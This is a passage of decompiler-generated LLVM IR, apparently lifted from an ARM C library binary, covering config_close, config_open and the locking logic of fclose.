  uselistorder label %dec_label_pc_15688, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15670, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_15660, { 1, 0 }
  uselistorder label %dec_label_pc_15650, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15604, { 1, 0 }
  uselistorder label %dec_label_pc_153d4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15564, { 1, 0 }
  uselistorder label %dec_label_pc_1553c, { 1, 0 }
  uselistorder label %dec_label_pc_15530, { 0, 2, 1 }
  uselistorder label %dec_label_pc_154f4, { 1, 0 }
  uselistorder label %dec_label_pc_15428, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_1569c = icmp eq i32* %arg1, null
  br i1 %v2_1569c, label %dec_label_pc_156c4, label %dec_label_pc_156a4

dec_label_pc_156a4:                               ; preds = %entry
  %v2_156a4 = load i32, i32* %arg1, align 4
  %v1_156a8 = inttoptr i32 %v2_156a4 to i16*
  %v2_156a8 = call i32 @__GI_fclose(i16* %v1_156a8)
  %v0_156ac = load i32, i32* @r4, align 4
  %v1_156ac = add i32 %v0_156ac, 20
  %v2_156ac = inttoptr i32 %v1_156ac to i32*
  %v3_156ac = load i32, i32* %v2_156ac, align 4
  %v2_156b0 = icmp eq i32 %v3_156ac, 0
  br i1 %v2_156b0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_156a4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_156a4, %bb
  store i32 87740, i32* @lr, align 4
  %v1_156b8 = xor i1 %v2_156b0, true
  call void @__pseudo_cond_branch(i1 %v1_156b8, i32 ptrtoint (i32* @global_var_12d8c.33 to i32))
  %v0_156bc = load i32, i32* @r4, align 4
  store i32 %v0_156bc, i32* @r0, align 4
  %v0_156c0 = call i32 @free()
  br label %dec_label_pc_156c4

dec_label_pc_156c4:                               ; preds = %entry, %bb6
  %v1_156c8 = phi i32 [ 0, %entry ], [ %v0_156c0, %bb6 ]
  ret i32 %v1_156c8

; uselistorder directives
  uselistorder label %dec_label_pc_156c4, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_156d8 = load i32, i32* @r4, align 4
  store i32 %v3_156d8, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 -33972), i32* @r1, align 4
  %v0_156e0 = call i32 @__GI_fopen()
  store i32 %v0_156e0, i32* %r0.global-to-local, align 4
  store i32 %v0_156e0, i32* @r4, align 4
  %v2_156e4 = icmp eq i32 %v0_156e0, 0
  br i1 %v2_156e4, label %bb, label %dec_label_pc_156f0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_156f0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_156f8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_156f8, i32* %r0.global-to-local, align 4
  %v2_156fc = icmp eq i32 %v2_156f8, 0
  br i1 %v2_156fc, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_156f0
  %v1_15700 = load i32, i32* @r4, align 4
  %v3_15700 = inttoptr i32 %v2_156f8 to i32*
  store i32 %v1_15700, i32* %v3_15700, align 4
  %v1_15708.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_156f0, %bb4
  %v1_15708 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_156f0 ], [ %v1_15708.pre, %bb4 ]
  %v2_15704 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15704, i32* @r4, align 4
  ret i32 %v1_15708

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 40, 38, 39, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 0, 26, 25, 24, 23, 22, 2, 1, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15714 = load i32, i32* @r4, align 4
  store i32 %v3_15714, i32* %stack_var_-36, align 4
  %v6_15714 = load i32, i32* @r5, align 4
  %v9_15714 = load i32, i32* @r6, align 4
  %v12_15714 = load i32, i32* @r7, align 4
  %v2_15718 = add i32 %tmp, 52
  %v3_15718 = inttoptr i32 %v2_15718 to i32*
  %v4_15718 = load i32, i32* %v3_15718, align 4
  store i32 %v4_15718, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15720 = icmp eq i32 %v4_15718, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r8, align 4
  br i1 %v2_15720, label %dec_label_pc_15734, label %dec_label_pc_15798

dec_label_pc_15734:                               ; preds = %entry
  %v0_15734 = call i32 @__aeabi_read_tp()
  store i32 %v0_15734, i32* %r0.global-to-local, align 4
  %v0_15738 = load i32, i32* @r5, align 4
  %v1_15738 = add i32 %v0_15738, 64
  %v2_15738 = inttoptr i32 %v1_15738 to i32*
  %v3_15738 = load i32, i32* %v2_15738, align 4
  store i32 %v3_15738, i32* %r3.global-to-local, align 4
  %v1_1573c = add i32 %v0_15734, -1168
  store i32 %v1_1573c, i32* @r6, align 4
  %v3_15740 = icmp uge i32 %v3_15738, %v1_1573c
  store i1 %v3_15740, i1* %cpsr_c.global-to-local, align 1
  %v9_15740 = icmp eq i32 %v3_15738, %v1_1573c
  br i1 %v9_15740, label %dec_label_pc_1578c, label %dec_label_pc_15748

dec_label_pc_15748:                               ; preds = %dec_label_pc_15734
  %v1_15748 = add i32 %v0_15738, 56
  store i32 %v1_15748, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_15748, i32* %r2.global-to-local, align 4
  %v0_15754 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15754, i32* @r4, align 4
  %v1_15758115 = inttoptr i32 %v1_15748 to i32*
  %v2_15758116 = load i32, i32* %v1_15758115, align 4
  store i32 %v2_15758116, i32* %r3.global-to-local, align 4
  %v3_1575c118 = icmp uge i32 %v2_15758116, %v0_15754
  store i1 %v3_1575c118, i1* %cpsr_c.global-to-local, align 1
  %v9_1575c124 = icmp eq i32 %v2_15758116, %v0_15754
  br i1 %v9_1575c124, label %dec_label_pc_15764, label %dec_label_pc_1577c

dec_label_pc_15764:                               ; preds = %dec_label_pc_15748, %dec_label_pc_15764.dec_label_pc_15758_crit_edge
  %v0_15764125 = phi i32 [ %v1_1575c.pre, %dec_label_pc_15764.dec_label_pc_15758_crit_edge ], [ %v0_15754, %dec_label_pc_15748 ]
  store i32 %v0_15764125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15774 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15774, label %dec_label_pc_15778, label %dec_label_pc_15764.dec_label_pc_15758_crit_edge

dec_label_pc_15764.dec_label_pc_15758_crit_edge:  ; preds = %dec_label_pc_15764
  %v0_15758.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1575c.pre = load i32, i32* @r4, align 4
  %v1_15758 = inttoptr i32 %v0_15758.pre to i32*
  %v2_15758 = load i32, i32* %v1_15758, align 4
  store i32 %v2_15758, i32* %r3.global-to-local, align 4
  %v3_1575c = icmp uge i32 %v2_15758, %v1_1575c.pre
  store i1 %v3_1575c, i1* %cpsr_c.global-to-local, align 1
  %v9_1575c = icmp eq i32 %v2_15758, %v1_1575c.pre
  br i1 %v9_1575c, label %dec_label_pc_15764, label %dec_label_pc_1577c

dec_label_pc_15778:                               ; preds = %dec_label_pc_15764
  %v0_15778 = load i32, i32* @r4, align 4
  store i32 %v0_15778, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1577c

dec_label_pc_1577c:                               ; preds = %dec_label_pc_15748, %dec_label_pc_15764.dec_label_pc_15758_crit_edge, %dec_label_pc_15778
  %v0_1577c = phi i32 [ %v0_15778, %dec_label_pc_15778 ], [ %v2_15758116, %dec_label_pc_15748 ], [ %v2_15758, %dec_label_pc_15764.dec_label_pc_15758_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1577c = icmp eq i32 %v0_1577c, 0
  br i1 %v2_1577c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_1577c
  %v1_15780 = load i32, i32* @r7, align 4
  store i32 %v1_15780, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_1577c, %bb
  %v1_15784 = xor i1 %v2_1577c, true
  call void @__pseudo_cond_branch(i1 %v1_15784, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_15788 = load i32, i32* @r6, align 4
  %v1_15788 = load i32, i32* @r5, align 4
  %v2_15788 = add i32 %v1_15788, 64
  %v3_15788 = inttoptr i32 %v2_15788 to i32*
  store i32 %v0_15788, i32* %v3_15788, align 4
  %v0_1578c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1578c

dec_label_pc_1578c:                               ; preds = %dec_label_pc_15734, %bb41
  %v0_1578c = phi i32 [ %v0_15738, %dec_label_pc_15734 ], [ %v0_1578c.pre, %bb41 ]
  %v1_1578c = add i32 %v0_1578c, 60
  %v2_1578c = inttoptr i32 %v1_1578c to i32*
  %v3_1578c = load i32, i32* %v2_1578c, align 4
  %v1_15790 = add i32 %v3_1578c, 1
  store i32 %v1_15790, i32* %r3.global-to-local, align 4
  store i32 %v1_15790, i32* %v2_1578c, align 4
  %v0_15798.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15798

dec_label_pc_15798:                               ; preds = %entry, %dec_label_pc_1578c
  %v1_157a0 = phi i32 [ %tmp, %entry ], [ %v0_15798.pre, %dec_label_pc_1578c ]
  %v1_15798 = inttoptr i32 %v1_157a0 to i16*
  %v2_15798 = load i16, i16* %v1_15798, align 2
  %v3_15798 = zext i16 %v2_15798 to i32
  store i32 %v3_15798, i32* %r3.global-to-local, align 4
  %v1_1579c = and i32 %v3_15798, 64
  %v2_1579c = icmp eq i32 %v1_1579c, 0
  br i1 %v2_1579c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_15798
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_15798, %bb42
  %storemerge = phi i32 [ %v1_157a0, %bb42 ], [ %v1_1579c, %dec_label_pc_15798 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 87976, i32* @lr, align 4
  %v1_157a4 = xor i1 %v2_1579c, true
  call void @__pseudo_cond_branch(i1 %v1_157a4, i32 ptrtoint (i32* @global_var_165e8.603 to i32))
  %v0_157a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_157a8, i32* %fp.global-to-local, align 4
  %v0_157ac = load i32, i32* @r5, align 4
  %v1_157ac = add i32 %v0_157ac, 4
  %v2_157ac = inttoptr i32 %v1_157ac to i32*
  %v3_157ac = load i32, i32* %v2_157ac, align 4
  store i32 %v3_157ac, i32* %r0.global-to-local, align 4
  %v1_157b0 = call i32 @__GI___libc_close(i32 %v3_157ac)
  store i32 %v1_157b0, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_157b8 = load i32, i32* @r8, align 4
  %v2_157b8 = add i32 %v0_157b8, 160
  %v3_157b8 = inttoptr i32 %v2_157b8 to i32*
  %v4_157b8 = load i32, i32* %v3_157b8, align 4
  store i32 %v4_157b8, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_157bc = icmp slt i32 %v1_157b0, 0
  br i1 %v1_157bc, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_157c4 = add i32 %v4_157b8, 8
  %v2_157c4 = inttoptr i32 %v1_157c4 to i32*
  %v3_157c4 = load i32, i32* %v2_157c4, align 4
  store i32 %v3_157c4, i32* %r3.global-to-local, align 4
  %v0_157c8 = call i32 @__aeabi_read_tp()
  store i32 %v0_157c8, i32* %r0.global-to-local, align 4
  %v1_157cc = add i32 %v0_157c8, -1168
  store i32 %v1_157cc, i32* %sl.global-to-local, align 4
  %v0_157d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_157d0 = icmp uge i32 %v0_157d0, %v1_157cc
  store i1 %v3_157d0, i1* %cpsr_c.global-to-local, align 1
  %v9_157d0 = icmp eq i32 %v0_157d0, %v1_157cc
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_157d8 = load i32, i32* @r5, align 4
  %v2_157d8 = add i32 %v1_157d8, 4
  %v3_157d8 = inttoptr i32 %v2_157d8 to i32*
  store i32 -1, i32* %v3_157d8, align 4
  br i1 %v9_157d0, label %dec_label_pc_15820, label %dec_label_pc_157e0

dec_label_pc_157e0:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_157e4 = load i32, i32* @r7, align 4
  store i32 %v0_157e4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_157ec108 = inttoptr i32 %v0_157e4 to i32*
  %v2_157ec109 = load i32, i32* %v1_157ec108, align 4
  store i32 %v2_157ec109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_157f0111 = icmp eq i32 %v2_157ec109, 0
  br i1 %v9_157f0111, label %dec_label_pc_157f8, label %dec_label_pc_15810

dec_label_pc_157f8:                               ; preds = %dec_label_pc_157e0, %dec_label_pc_157f8.dec_label_pc_157ec_crit_edge
  %v0_157f8112 = phi i32 [ %v1_157f0.pre, %dec_label_pc_157f8.dec_label_pc_157ec_crit_edge ], [ 0, %dec_label_pc_157e0 ]
  store i32 %v0_157f8112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15808 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15808, label %dec_label_pc_1580c, label %dec_label_pc_157f8.dec_label_pc_157ec_crit_edge

dec_label_pc_157f8.dec_label_pc_157ec_crit_edge:  ; preds = %dec_label_pc_157f8
  %v0_157ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_157f0.pre = load i32, i32* @r4, align 4
  %v1_157ec = inttoptr i32 %v0_157ec.pre to i32*
  %v2_157ec = load i32, i32* %v1_157ec, align 4
  store i32 %v2_157ec, i32* %r3.global-to-local, align 4
  %v3_157f0 = icmp uge i32 %v2_157ec, %v1_157f0.pre
  store i1 %v3_157f0, i1* %cpsr_c.global-to-local, align 1
  %v9_157f0 = icmp eq i32 %v2_157ec, %v1_157f0.pre
  br i1 %v9_157f0, label %dec_label_pc_157f8, label %dec_label_pc_15810

dec_label_pc_1580c:                               ; preds = %dec_label_pc_157f8
  %v0_1580c = load i32, i32* @r4, align 4
  store i32 %v0_1580c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15810

dec_label_pc_15810:                               ; preds = %dec_label_pc_157e0, %dec_label_pc_157f8.dec_label_pc_157ec_crit_edge, %dec_label_pc_1580c
  %v0_15810 = phi i32 [ %v0_1580c, %dec_label_pc_1580c ], [ %v2_157ec109, %dec_label_pc_157e0 ], [ %v2_157ec, %dec_label_pc_157f8.dec_label_pc_157ec_crit_edge ]
  %v1_15810 = phi i32 [ %v0_1580c, %dec_label_pc_1580c ], [ 0, %dec_label_pc_157e0 ], [ %v1_157f0.pre, %dec_label_pc_157f8.dec_label_pc_157ec_crit_edge ]
  %v3_15810 = icmp uge i32 %v0_15810, %v1_15810
  store i1 %v3_15810, i1* %cpsr_c.global-to-local, align 1
  %v9_15810 = icmp eq i32 %v0_15810, %v1_15810
  br i1 %v9_15810, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_15810
  %v1_15814 = load i32, i32* @r7, align 4
  store i32 %v1_15814, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_15810, %bb46
  %v1_15818 = xor i1 %v9_15810, true
  call void @__pseudo_cond_branch(i1 %v1_15818, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_1581c = load i32, i32* %sl.global-to-local, align 4
  %v1_1581c = load i32, i32* @r7, align 4
  %v2_1581c = add i32 %v1_1581c, 8
  %v3_1581c = inttoptr i32 %v2_1581c to i32*
  store i32 %v0_1581c, i32* %v3_1581c, align 4
  br label %dec_label_pc_15820

dec_label_pc_15820:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15824 = load i32, i32* @r8, align 4
  %v2_15824 = add i32 %v0_15824, 160
  %v3_15824 = inttoptr i32 %v2_15824 to i32*
  %v4_15824 = load i32, i32* %v3_15824, align 4
  store i32 %v4_15824, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1582c = add i32 %v0_15824, 12
  %v3_1582c = inttoptr i32 %v2_1582c to i32*
  %v4_1582c = load i32, i32* %v3_1582c, align 4
  store i32 %v4_1582c, i32* %r2.global-to-local, align 4
  %v1_15830 = add i32 %v4_15824, 4
  %v2_15830 = inttoptr i32 %v1_15830 to i32*
  %v3_15830 = load i32, i32* %v2_15830, align 4
  store i32 %v3_15830, i32* %r1.global-to-local, align 4
  %v1_15834 = inttoptr i32 %v4_1582c to i32*
  %v2_15834 = load i32, i32* %v1_15834, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15838 = icmp eq i32 %v3_15830, 0
  %v1_1583c = add i32 %v2_15834, 1
  store i32 %v1_1583c, i32* %r3.global-to-local, align 4
  store i32 %v1_1583c, i32* %v1_15834, align 4
  br i1 %v2_15838, label %dec_label_pc_15848, label %dec_label_pc_158a8

dec_label_pc_15848:                               ; preds = %dec_label_pc_15820
  %v0_15848 = load i32, i32* %r1.global-to-local, align 4
  %v1_15848 = load i32, i32* %r0.global-to-local, align 4
  %v2_15848 = add i32 %v1_15848, 8
  %v3_15848 = inttoptr i32 %v2_15848 to i32*
  store i32 %v0_15848, i32* %v3_15848, align 4
  %v0_1584c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1584c, i32* @r7, align 4
  br label %dec_label_pc_15850

dec_label_pc_15850:                               ; preds = %dec_label_pc_15880.dec_label_pc_15850_crit_edge, %dec_label_pc_15848
  %v0_15850 = phi i32 [ %v0_15850.pre, %dec_label_pc_15880.dec_label_pc_15850_crit_edge ], [ %v0_1584c, %dec_label_pc_15848 ]
  %v1_15850 = inttoptr i32 %v0_15850 to i32*
  %v2_15850 = load i32, i32* %v1_15850, align 4
  store i32 %v2_15850, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15850, i32* %r2.global-to-local, align 4
  %v2_1585c96 = load i32, i32* %v1_15850, align 4
  store i32 %v2_1585c96, i32* %r3.global-to-local, align 4
  %v3_1586098 = icmp uge i32 %v2_1585c96, %v2_15850
  store i1 %v3_1586098, i1* %cpsr_c.global-to-local, align 1
  %v9_15860104 = icmp eq i32 %v2_1585c96, %v2_15850
  br i1 %v9_15860104, label %dec_label_pc_15868, label %dec_label_pc_15880

dec_label_pc_15868:                               ; preds = %dec_label_pc_15850, %dec_label_pc_15868.dec_label_pc_1585c_crit_edge
  %v0_15868105 = phi i32 [ %v1_15860.pre, %dec_label_pc_15868.dec_label_pc_1585c_crit_edge ], [ %v2_15850, %dec_label_pc_15850 ]
  store i32 %v0_15868105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15878 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15878, label %dec_label_pc_1587c, label %dec_label_pc_15868.dec_label_pc_1585c_crit_edge

dec_label_pc_15868.dec_label_pc_1585c_crit_edge:  ; preds = %dec_label_pc_15868
  %v0_1585c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15860.pre = load i32, i32* @r4, align 4
  %v1_1585c = inttoptr i32 %v0_1585c.pre to i32*
  %v2_1585c = load i32, i32* %v1_1585c, align 4
  store i32 %v2_1585c, i32* %r3.global-to-local, align 4
  %v3_15860 = icmp uge i32 %v2_1585c, %v1_15860.pre
  store i1 %v3_15860, i1* %cpsr_c.global-to-local, align 1
  %v9_15860 = icmp eq i32 %v2_1585c, %v1_15860.pre
  br i1 %v9_15860, label %dec_label_pc_15868, label %dec_label_pc_15880

dec_label_pc_1587c:                               ; preds = %dec_label_pc_15868
  %v0_1587c = load i32, i32* @r4, align 4
  store i32 %v0_1587c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15880

dec_label_pc_15880:                               ; preds = %dec_label_pc_15850, %dec_label_pc_15868.dec_label_pc_1585c_crit_edge, %dec_label_pc_1587c
  %v0_15888 = phi i32 [ %v0_1587c, %dec_label_pc_1587c ], [ %v2_1585c96, %dec_label_pc_15850 ], [ %v2_1585c, %dec_label_pc_15868.dec_label_pc_1585c_crit_edge ]
  %v1_15880 = phi i32 [ %v0_1587c, %dec_label_pc_1587c ], [ %v2_15850, %dec_label_pc_15850 ], [ %v1_15860.pre, %dec_label_pc_15868.dec_label_pc_1585c_crit_edge ]
  %v3_15880 = icmp uge i32 %v0_15888, %v1_15880
  store i1 %v3_15880, i1* %cpsr_c.global-to-local, align 1
  %v9_15880 = icmp eq i32 %v0_15888, %v1_15880
  br i1 %v9_15880, label %dec_label_pc_15888, label %dec_label_pc_15880.dec_label_pc_15850_crit_edge

dec_label_pc_15880.dec_label_pc_15850_crit_edge:  ; preds = %dec_label_pc_15880
  %v0_15850.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15850

dec_label_pc_15888:                               ; preds = %dec_label_pc_15880
  %v2_15888 = icmp ne i32 %v1_15880, 0
  store i1 %v2_15888, i1* %cpsr_c.global-to-local, align 1
  %v7_1588c = icmp slt i32 %v1_15880, 2
  br i1 %v7_1588c, label %dec_label_pc_158a8, label %dec_label_pc_15890

dec_label_pc_15890:                               ; preds = %dec_label_pc_15888
  %v0_15890 = load i32, i32* @r7, align 4
  store i32 %v0_15890, i32* %r0.global-to-local, align 4
  %v0_15894 = load i32, i32* %r1.global-to-local, align 4
  %v1_15894 = add i32 %v0_15894, 129
  store i32 %v1_15894, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_158a8

dec_label_pc_158a8:                               ; preds = %dec_label_pc_15820, %dec_label_pc_15890, %dec_label_pc_15888
  %v0_158a8 = load i32, i32* @r5, align 4
  %v1_158a8 = inttoptr i32 %v0_158a8 to i16*
  %v2_158a8 = load i16, i16* %v1_158a8, align 2
  %v3_158a8 = zext i16 %v2_158a8 to i32
  %v1_158ac = and i32 %v3_158a8, 24576
  %v1_158b0 = or i32 %v1_158ac, 48
  store i32 %v1_158b0, i32* %r3.global-to-local, align 4
  %v0_158b4 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_158b4 = icmp eq i32 %v0_158b4, 0
  %v1_158b8 = trunc i32 %v1_158b0 to i16
  store i16 %v1_158b8, i16* %v1_158a8, align 2
  br i1 %v2_158b4, label %dec_label_pc_158c0, label %dec_label_pc_15934

dec_label_pc_158c0:                               ; preds = %dec_label_pc_158a8
  %v0_158c0 = load i32, i32* @r5, align 4
  %v1_158c0 = add i32 %v0_158c0, 60
  %v2_158c0 = inttoptr i32 %v1_158c0 to i32*
  %v3_158c0 = load i32, i32* %v2_158c0, align 4
  %v1_158c4 = add i32 %v3_158c0, -1
  store i32 %v1_158c4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_158c8 = icmp eq i32 %v1_158c4, 0
  store i32 %v1_158c4, i32* %v2_158c0, align 4
  br i1 %v2_158c8, label %dec_label_pc_158d4, label %dec_label_pc_15934

dec_label_pc_158d4:                               ; preds = %dec_label_pc_158c0
  %v0_158d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_158d4 = load i32, i32* @r5, align 4
  %v2_158d4 = add i32 %v1_158d4, 64
  %v3_158d4 = inttoptr i32 %v2_158d4 to i32*
  store i32 %v0_158d4, i32* %v3_158d4, align 4
  %v0_158d8 = load i32, i32* @r5, align 4
  %v1_158d8 = add i32 %v0_158d8, 56
  store i32 %v1_158d8, i32* @r6, align 4
  br label %dec_label_pc_158dc

dec_label_pc_158dc:                               ; preds = %dec_label_pc_1590c.dec_label_pc_158dc_crit_edge, %dec_label_pc_158d4
  %v0_158e4 = phi i32 [ %v0_158e4.pre, %dec_label_pc_1590c.dec_label_pc_158dc_crit_edge ], [ %v1_158d8, %dec_label_pc_158d4 ]
  %v0_158dc = phi i32 [ %v0_158dc.pre, %dec_label_pc_1590c.dec_label_pc_158dc_crit_edge ], [ %v0_158d8, %dec_label_pc_158d4 ]
  %v1_158dc = add i32 %v0_158dc, 56
  %v2_158dc = inttoptr i32 %v1_158dc to i32*
  %v3_158dc = load i32, i32* %v2_158dc, align 4
  store i32 %v3_158dc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_158e4, i32* %r2.global-to-local, align 4
  %v1_158e882 = inttoptr i32 %v0_158e4 to i32*
  %v2_158e883 = load i32, i32* %v1_158e882, align 4
  store i32 %v2_158e883, i32* %r3.global-to-local, align 4
  %v3_158ec85 = icmp uge i32 %v2_158e883, %v3_158dc
  store i1 %v3_158ec85, i1* %cpsr_c.global-to-local, align 1
  %v9_158ec91 = icmp eq i32 %v2_158e883, %v3_158dc
  br i1 %v9_158ec91, label %dec_label_pc_158f4, label %dec_label_pc_1590c

dec_label_pc_158f4:                               ; preds = %dec_label_pc_158dc, %dec_label_pc_158f4.dec_label_pc_158e8_crit_edge
  %v0_158f492 = phi i32 [ %v1_158ec.pre, %dec_label_pc_158f4.dec_label_pc_158e8_crit_edge ], [ %v3_158dc, %dec_label_pc_158dc ]
  store i32 %v0_158f492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15904 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15904, label %dec_label_pc_15908, label %dec_label_pc_158f4.dec_label_pc_158e8_crit_edge

dec_label_pc_158f4.dec_label_pc_158e8_crit_edge:  ; preds = %dec_label_pc_158f4
  %v0_158e8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_158ec.pre = load i32, i32* @r4, align 4
  %v1_158e8 = inttoptr i32 %v0_158e8.pre to i32*
  %v2_158e8 = load i32, i32* %v1_158e8, align 4
  store i32 %v2_158e8, i32* %r3.global-to-local, align 4
  %v3_158ec = icmp uge i32 %v2_158e8, %v1_158ec.pre
  store i1 %v3_158ec, i1* %cpsr_c.global-to-local, align 1
  %v9_158ec = icmp eq i32 %v2_158e8, %v1_158ec.pre
  br i1 %v9_158ec, label %dec_label_pc_158f4, label %dec_label_pc_1590c

dec_label_pc_15908:                               ; preds = %dec_label_pc_158f4
  %v0_15908 = load i32, i32* @r4, align 4
  store i32 %v0_15908, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1590c

dec_label_pc_1590c:                               ; preds = %dec_label_pc_158dc, %dec_label_pc_158f4.dec_label_pc_158e8_crit_edge, %dec_label_pc_15908
  %v0_15914 = phi i32 [ %v0_15908, %dec_label_pc_15908 ], [ %v2_158e883, %dec_label_pc_158dc ], [ %v2_158e8, %dec_label_pc_158f4.dec_label_pc_158e8_crit_edge ]
  %v1_1590c = phi i32 [ %v0_15908, %dec_label_pc_15908 ], [ %v3_158dc, %dec_label_pc_158dc ], [ %v1_158ec.pre, %dec_label_pc_158f4.dec_label_pc_158e8_crit_edge ]
  %v3_1590c = icmp uge i32 %v0_15914, %v1_1590c
  store i1 %v3_1590c, i1* %cpsr_c.global-to-local, align 1
  %v9_1590c = icmp eq i32 %v0_15914, %v1_1590c
  br i1 %v9_1590c, label %dec_label_pc_15914, label %dec_label_pc_1590c.dec_label_pc_158dc_crit_edge

dec_label_pc_1590c.dec_label_pc_158dc_crit_edge:  ; preds = %dec_label_pc_1590c
  %v0_158dc.pre = load i32, i32* @r5, align 4
  %v0_158e4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_158dc

dec_label_pc_15914:                               ; preds = %dec_label_pc_1590c
  %v2_15914 = icmp ne i32 %v1_1590c, 0
  store i1 %v2_15914, i1* %cpsr_c.global-to-local, align 1
  %v7_15918 = icmp slt i32 %v1_1590c, 2
  br i1 %v7_15918, label %dec_label_pc_15934, label %dec_label_pc_1591c

